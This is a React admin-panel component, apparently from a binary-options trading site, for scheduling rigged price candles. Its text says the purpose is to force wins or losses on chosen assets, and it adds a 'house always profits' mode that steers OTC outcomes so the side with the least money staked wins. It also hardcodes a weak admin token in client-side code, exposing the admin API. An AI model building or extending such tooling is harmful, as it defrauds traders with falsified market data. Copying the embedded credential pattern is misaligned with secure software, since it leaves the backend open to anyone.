"use client"

import { useEffect, useMemo, useState } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Switch } from "@/components/ui/switch"
import { RefreshCw, Search, TrendingUp, TrendingDown, Trash2, Clock, Plus, Zap, ShieldCheck } from "lucide-react"
import { ASSET_CATALOG } from "@/lib/asset-catalog"

const ADMIN_TOKEN = "Admin123!"

type Intensity = "SOFT" | "MEDIUM" | "STRONG"
type CandleShape = "AUTO" | "DOJI" | "FULL" | "HAMMER" | "SHOOTING_STAR" | "ENGULFING"

interface Manipulation {
  id: string
  symbol: string
  direction: "UP" | "DOWN"
  intensity: Intensity
  close_shape?: CandleShape
  start_at: string
  end_at: string
  active: boolean
  created_at: string
}

const DURATION_PRESETS = [
  { label: "30s", seconds: 30 },
  { label: "1 min", seconds: 60 },
  { label: "2 min", seconds: 120 },
  { label: "5 min", seconds: 300 },
]

// 3 tipos de movimento: quanto maior a intensidade, mais agressiva a vela.
const INTENSITY_OPTIONS: { value: Intensity; label: string; desc: string }[] = [
  { value: "SOFT", label: "Suave", desc: "Movimento leve e gradual" },
  { value: "MEDIUM", label: "Médio", desc: "Movimento firme e visível" },
  { value: "STRONG", label: "Forte", desc: "Movimento agressivo e rápido" },
]

function intensityLabel(v?: Intensity) {
  return INTENSITY_OPTIONS.find((o) => o.value === (v || "MEDIUM"))?.label || "Médio"
}

// Formato da VELA DE FECHAMENTO da janela (apenas visual; a cor segue a direção).
const SHAPE_OPTIONS: { value: CandleShape; label: string; desc: string }[] = [
  { value: "AUTO", label: "Automático", desc: "Vela natural" },
  { value: "DOJI", label: "Doji", desc: "Corpo mínimo, pavios dos 2 lados" },
  { value: "FULL", label: "Cheia", desc: "Corpo grande, quase sem pavio" },
  { value: "HAMMER", label: "Martelo", desc: "Pavio inferior longo" },
  { value: "SHOOTING_STAR", label: "Estrela cadente", desc: "Pavio superior longo" },
  { value: "ENGULFING", label: "Engolfo", desc: "Corpo grande que engole" },
]

function shapeLabel(v?: CandleShape) {
  return SHAPE_OPTIONS.find((o) => o.value === (v || "AUTO"))?.label || "Automático"
}

// datetime-local usa horario LOCAL; convertemos considerando o offset do fuso.
function toLocalInputValue(date: Date): string {
  const off = date.getTimezoneOffset() * 60000
  return new Date(date.getTime() - off).toISOString().slice(0, 16)
}

function assetLabel(symbol: string) {
  const a = ASSET_CATALOG.find((x) => x.symbol === symbol)
  return a?.name || symbol
}
function assetLogo(symbol: string) {
  const a = ASSET_CATALOG.find((x) => x.symbol === symbol)
  return a?.logo || "/placeholder.svg"
}

function statusOf(m: Manipulation): { label: string; className: string } {
  const now = Date.now()
  const start = new Date(m.start_at).getTime()
  const end = new Date(m.end_at).getTime()
  if (!m.active) return { label: "Desativada", className: "bg-gray-500/20 text-gray-400" }
  if (now > end) return { label: "Expirada", className: "bg-gray-500/20 text-gray-400" }
  if (now >= start && now <= end) return { label: "AO VIVO", className: "bg-red-500/20 text-red-400" }
  return { label: "Agendada", className: "bg-yellow-500/20 text-yellow-400" }
}

export function AdminManipulation() {
  const [items, setItems] = useState<Manipulation[]>([])
  const [loading, setLoading] = useState(true)
  const [creating, setCreating] = useState(false)
  const [error, setError] = useState("")
  const [assetSearch, setAssetSearch] = useState("")

  // Modo "a casa sempre no lucro"
  const [houseWins, setHouseWins] = useState(false)
  const [houseSaving, setHouseSaving] = useState(false)

  // Formulario
  const [symbol, setSymbol] = useState(ASSET_CATALOG[0]?.symbol || "")
  const [direction, setDirection] = useState<"UP" | "DOWN">("UP")
  const [intensity, setIntensity] = useState<Intensity>("MEDIUM")
  const [closeShape, setCloseShape] = useState<CandleShape>("AUTO")
  const [startAt, setStartAt] = useState(() => toLocalInputValue(new Date(Date.now() + 60_000)))
  const [durationSeconds, setDurationSeconds] = useState(60)

  const fetchItems = async () => {
    setLoading(true)
    try {
      const res = await fetch("/api/admin/manipulations", { headers: { "x-admin-token": ADMIN_TOKEN } })
      const data = await res.json()
      if (res.ok) setItems(data.manipulations || [])
    } catch {
      // silencioso
    } finally {
      setLoading(false)
    }
  }

  const fetchHouse = async () => {
    try {
      const res = await fetch("/api/admin/settings", { headers: { "x-admin-token": ADMIN_TOKEN } })
      const data = await res.json()
      if (res.ok) {
        const v = data.house_always_wins
        setHouseWins(v === true || v === "true" || v === '"true"')
      }
    } catch {
      // silencioso
    }
  }

  const toggleHouse = async (value: boolean) => {
    setHouseWins(value)
    setHouseSaving(true)
    try {
      await fetch("/api/admin/settings", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-token": ADMIN_TOKEN },
        body: JSON.stringify({ house_always_wins: value }),
      })
    } catch {
      setHouseWins(!value)
    } finally {
      setHouseSaving(false)
    }
  }

  useEffect(() => {
    fetchItems()
    fetchHouse()
    const interval = setInterval(fetchItems, 15_000)
    return () => clearInterval(interval)
  }, [])

  const createManipulation = async () => {
    setError("")
    setCreating(true)
    try {
      const start = new Date(startAt)
      const end = new Date(start.getTime() + durationSeconds * 1000)
      const res = await fetch("/api/admin/manipulations", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-token": ADMIN_TOKEN },
        body: JSON.stringify({
          symbol,
          direction,
          intensity,
          close_shape: closeShape,
          start_at: start.toISOString(),
          end_at: end.toISOString(),
        }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || "Erro ao criar manipulação")
      await fetchItems()
    } catch (e: any) {
      setError(e.message)
    } finally {
      setCreating(false)
    }
  }

  const toggleActive = async (id: string, active: boolean) => {
    setItems((prev) => prev.map((m) => (m.id === id ? { ...m, active } : m)))
    try {
      await fetch("/api/admin/manipulations", {
        method: "PATCH",
        headers: { "Content-Type": "application/json", "x-admin-token": ADMIN_TOKEN },
        body: JSON.stringify({ id, active }),
      })
    } catch {
      setItems((prev) => prev.map((m) => (m.id === id ? { ...m, active: !active } : m)))
    }
  }

  const removeItem = async (id: string) => {
    const prev = items
    setItems((p) => p.filter((m) => m.id !== id))
    try {
      await fetch(`/api/admin/manipulations?id=${id}`, {
        method: "DELETE",
        headers: { "x-admin-token": ADMIN_TOKEN },
      })
    } catch {
      setItems(prev)
    }
  }

  const startNow = () => setStartAt(toLocalInputValue(new Date(Date.now() + 5_000)))

  const filteredAssets = useMemo(
    () =>
      ASSET_CATALOG.filter(
        (a) =>
          a.name.toLowerCase().includes(assetSearch.toLowerCase()) ||
          a.symbol.toLowerCase().includes(assetSearch.toLowerCase()),
      ),
    [assetSearch],
  )

  const fmt = (iso: string) =>
    new Date(iso).toLocaleString("pt-BR", {
      day: "2-digit",
      month: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    })

  const liveCount = items.filter((m) => statusOf(m).label === "AO VIVO").length

  return (
    <div>
      <div className="mb-6">
        <h1 className="text-2xl font-bold tracking-tight text-white">Manipulação de Velas</h1>
        <p className="mt-1 text-sm text-gray-400">
          Programe a direção da vela de um ativo em um horário específico para forçar Win ou Loss.
          {liveCount > 0 && (
            <span className="ml-2 inline-flex items-center gap-1 rounded-full bg-red-500/15 px-2 py-0.5 text-xs font-semibold text-red-400">
              <Zap className="h-3 w-3" /> {liveCount} ao vivo
            </span>
          )}
        </p>
      </div>

      {/* Modo "a casa sempre no lucro" */}
      <div
        className={`mb-6 flex items-center gap-4 rounded-2xl border p-5 transition-colors ${
          houseWins ? "border-emerald-500/40 bg-emerald-500/[0.06]" : "border-white/[0.08] bg-[#0c121c]"
        }`}
      >
        <div
          className={`flex h-11 w-11 shrink-0 items-center justify-center rounded-xl ${
            houseWins ? "bg-emerald-500/20 text-emerald-400" : "bg-white/[0.05] text-gray-400"
          }`}
        >
          <ShieldCheck className="h-5 w-5" />
        </div>
        <div className="min-w-0 flex-1">
          <div className="flex items-center gap-2">
            <h2 className="text-sm font-semibold text-white">A casa sempre no lucro</h2>
            {houseWins && (
              <span className="rounded-full bg-emerald-500/15 px-2 py-0.5 text-[10px] font-bold text-emerald-400">
                ATIVO
              </span>
            )}
          </div>
          <p className="mt-0.5 text-xs leading-snug text-gray-400">
            Automático: nas velas OTC, o resultado é direcionado para o lado com <b>menor capital apostado</b> vencer,
            fazendo a casa pagar o menor valor possível. Não afeta ativos reais (Mercado Aberto).
          </p>
        </div>
        <Switch checked={houseWins} disabled={houseSaving} onCheckedChange={toggleHouse} />
      </div>

      {/* Formulario de criacao */}
      <div className="mb-8 rounded-2xl border border-white/[0.08] bg-[#0c121c] p-5">
        <h2 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-wider text-gray-300">
          <Plus className="h-4 w-4" /> Nova programação
        </h2>

        {/* Selecao de ativo */}
        <label className="mb-1.5 block text-xs font-medium text-gray-400">Ativo</label>
        <div className="relative mb-3">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500" />
          <input
            placeholder="Buscar ativo..."
            value={assetSearch}
            onChange={(e) => setAssetSearch(e.target.value)}
            className="h-10 w-full rounded-lg border border-white/[0.06] bg-[#0a0e16] pl-9 pr-3 text-sm text-white outline-none placeholder:text-gray-500 focus:border-white/20"
          />
        </div>
        <div className="mb-4 grid max-h-44 grid-cols-2 gap-2 overflow-y-auto pr-1 md:grid-cols-3 lg:grid-cols-4">
          {filteredAssets.map((a) => (
            <button
              key={a.symbol}
              onClick={() => setSymbol(a.symbol)}
              className={`flex items-center gap-2 rounded-xl border p-2 text-left transition-all ${
                symbol === a.symbol
                  ? "border-blue-500 bg-blue-500/10"
                  : "border-white/[0.06] bg-[#0a0e16] hover:border-white/20"
              }`}
            >
              <div className="relative h-8 w-8 shrink-0 overflow-hidden rounded-lg ring-1 ring-white/10">
                <Image src={a.logo || "/placeholder.svg"} alt={a.name} fill sizes="32px" className="object-cover" />
              </div>
              <span className="min-w-0 truncate text-xs font-medium text-white">{a.name}</span>
            </button>
          ))}
        </div>

        {/* Direcao */}
        <label className="mb-1.5 block text-xs font-medium text-gray-400">Direção da vela</label>
        <div className="mb-4 grid grid-cols-2 gap-3">
          <button
            onClick={() => setDirection("UP")}
            className={`flex items-center justify-center gap-2 rounded-xl border p-3 font-semibold transition-all ${
              direction === "UP"
                ? "border-emerald-500 bg-emerald-500/15 text-emerald-400"
                : "border-white/[0.06] bg-[#0a0e16] text-gray-400 hover:border-white/20"
            }`}
          >
            <TrendingUp className="h-5 w-5" /> CIMA (Win Call)
          </button>
          <button
            onClick={() => setDirection("DOWN")}
            className={`flex items-center justify-center gap-2 rounded-xl border p-3 font-semibold transition-all ${
              direction === "DOWN"
                ? "border-red-500 bg-red-500/15 text-red-400"
                : "border-white/[0.06] bg-[#0a0e16] text-gray-400 hover:border-white/20"
            }`}
          >
            <TrendingDown className="h-5 w-5" /> BAIXO (Win Put)
          </button>
        </div>

        {/* Intensidade do movimento */}
        <label className="mb-1.5 block text-xs font-medium text-gray-400">Tipo de movimento</label>
        <div className="mb-4 grid grid-cols-3 gap-2">
          {INTENSITY_OPTIONS.map((opt) => (
            <button
              key={opt.value}
              onClick={() => setIntensity(opt.value)}
              className={`flex flex-col items-center gap-1 rounded-xl border p-3 text-center transition-all ${
                intensity === opt.value
                  ? "border-blue-500 bg-blue-500/10"
                  : "border-white/[0.06] bg-[#0a0e16] hover:border-white/20"
              }`}
            >
              <div className="flex items-center gap-0.5">
                <Zap
                  className={`h-4 w-4 ${intensity === opt.value ? "text-blue-400" : "text-gray-500"}`}
                />
                {opt.value === "STRONG" && (
                  <Zap className={`h-4 w-4 ${intensity === opt.value ? "text-blue-400" : "text-gray-500"}`} />
                )}
              </div>
              <span className={`text-sm font-semibold ${intensity === opt.value ? "text-white" : "text-gray-400"}`}>
                {opt.label}
              </span>
              <span className="text-[10px] leading-tight text-gray-500">{opt.desc}</span>
            </button>
          ))}
        </div>

        {/* Formato da vela de fechamento */}
        <label className="mb-1.5 block text-xs font-medium text-gray-400">
          Formato da vela final <span className="text-gray-600">(a cor sempre segue a direção)</span>
        </label>
        <div className="mb-4 grid grid-cols-2 gap-2 sm:grid-cols-3">
          {SHAPE_OPTIONS.map((opt) => (
            <button
              key={opt.value}
              onClick={() => setCloseShape(opt.value)}
              className={`flex flex-col items-start gap-0.5 rounded-xl border p-3 text-left transition-all ${
                closeShape === opt.value
                  ? "border-blue-500 bg-blue-500/10"
                  : "border-white/[0.06] bg-[#0a0e16] hover:border-white/20"
              }`}
            >
              <span className={`text-sm font-semibold ${closeShape === opt.value ? "text-white" : "text-gray-400"}`}>
                {opt.label}
              </span>
              <span className="text-[10px] leading-tight text-gray-500">{opt.desc}</span>
            </button>
          ))}
        </div>

        {/* Horario de inicio */}
        <label className="mb-1.5 block text-xs font-medium text-gray-400">Horário de início</label>
        <div className="mb-4 flex flex-col gap-2 sm:flex-row">
          <input
            type="datetime-local"
            step={1}
            value={startAt}
            onChange={(e) => setStartAt(e.target.value)}
            className="h-10 flex-1 rounded-lg border border-white/[0.06] bg-[#0a0e16] px-3 text-sm text-white outline-none focus:border-white/20"
          />
          <Button
            type="button"
            onClick={startNow}
            variant="outline"
            className="h-10 border-white/[0.06] bg-[#0a0e16] text-gray-300 hover:bg-[#141c2b]"
          >
            <Clock className="mr-1.5 h-4 w-4" /> Agora
          </Button>
        </div>

        {/* Duracao */}
        <label className="mb-1.5 block text-xs font-medium text-gray-400">Duração</label>
        <div className="mb-5 flex flex-wrap gap-2">
          {DURATION_PRESETS.map((d) => (
            <button
              key={d.seconds}
              onClick={() => setDurationSeconds(d.seconds)}
              className={`rounded-lg border px-4 py-2 text-sm font-medium transition-all ${
                durationSeconds === d.seconds
                  ? "border-blue-500 bg-blue-500/10 text-blue-400"
                  : "border-white/[0.06] bg-[#0a0e16] text-gray-400 hover:border-white/20"
              }`}
            >
              {d.label}
            </button>
          ))}
        </div>

        {error && <p className="mb-3 text-sm text-red-400">{error}</p>}

        <Button
          onClick={createManipulation}
          disabled={creating || !symbol}
          className="w-full bg-blue-600 font-semibold hover:bg-blue-500"
        >
          {creating ? (
            <>
              <RefreshCw className="mr-2 h-4 w-4 animate-spin" /> Programando...
            </>
          ) : (
            <>
              <Plus className="mr-2 h-4 w-4" /> Programar manipulação
            </>
          )}
        </Button>
      </div>

      {/* Lista */}
      <div className="mb-3 flex items-center justify-between">
        <h2 className="text-sm font-semibold uppercase tracking-wider text-gray-400">Programações ({items.length})</h2>
        <Button
          onClick={fetchItems}
          variant="outline"
          size="icon"
          className="border-white/[0.06] bg-[#0c121c] hover:bg-[#141c2b]"
        >
          <RefreshCw className={`h-4 w-4 text-gray-300 ${loading ? "animate-spin" : ""}`} />
        </Button>
      </div>

      {loading && items.length === 0 ? (
        <div className="flex items-center justify-center py-16 text-gray-500">
          <RefreshCw className="mr-2 h-5 w-5 animate-spin" /> Carregando...
        </div>
      ) : items.length === 0 ? (
        <p className="py-16 text-center text-sm text-gray-500">Nenhuma manipulação programada.</p>
      ) : (
        <div className="space-y-2">
          {items.map((m) => {
            const status = statusOf(m)
            return (
              <div
                key={m.id}
                className="flex items-center gap-3 rounded-2xl border border-white/[0.06] bg-[#0c121c] p-3"
              >
                <div className="relative h-10 w-10 shrink-0 overflow-hidden rounded-xl ring-1 ring-white/10">
                  <Image src={assetLogo(m.symbol)} alt={assetLabel(m.symbol)} fill sizes="40px" className="object-cover" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="flex items-center gap-2">
                    <span className="truncate text-sm font-semibold text-white">{assetLabel(m.symbol)}</span>
                    <span
                      className={`inline-flex items-center gap-1 rounded px-1.5 py-0.5 text-[10px] font-bold ${
                        m.direction === "UP" ? "bg-emerald-500/15 text-emerald-400" : "bg-red-500/15 text-red-400"
                      }`}
                    >
                      {m.direction === "UP" ? (
                        <>
                          <TrendingUp className="h-3 w-3" /> CIMA
                        </>
                      ) : (
                        <>
                          <TrendingDown className="h-3 w-3" /> BAIXO
                        </>
                      )}
                    </span>
                    <span className={`rounded px-1.5 py-0.5 text-[10px] font-bold ${status.className}`}>
                      {status.label}
                    </span>
                    <span className="inline-flex items-center gap-0.5 rounded bg-blue-500/15 px-1.5 py-0.5 text-[10px] font-bold text-blue-400">
                      <Zap className="h-3 w-3" /> {intensityLabel(m.intensity)}
                    </span>
                    {m.close_shape && m.close_shape !== "AUTO" && (
                      <span className="rounded bg-purple-500/15 px-1.5 py-0.5 text-[10px] font-bold text-purple-300">
                        {shapeLabel(m.close_shape)}
                      </span>
                    )}
                  </div>
                  <p className="mt-0.5 truncate text-xs text-gray-500">
                    {fmt(m.start_at)} → {fmt(m.end_at)}
                  </p>
                </div>
                <Switch checked={m.active} onCheckedChange={(v) => toggleActive(m.id, v)} />
                <button
                  onClick={() => removeItem(m.id)}
                  className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-red-500/10 text-red-400 transition hover:bg-red-500/20"
                  aria-label="Remover"
                >
                  <Trash2 className="h-4 w-4" />
                </button>
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}
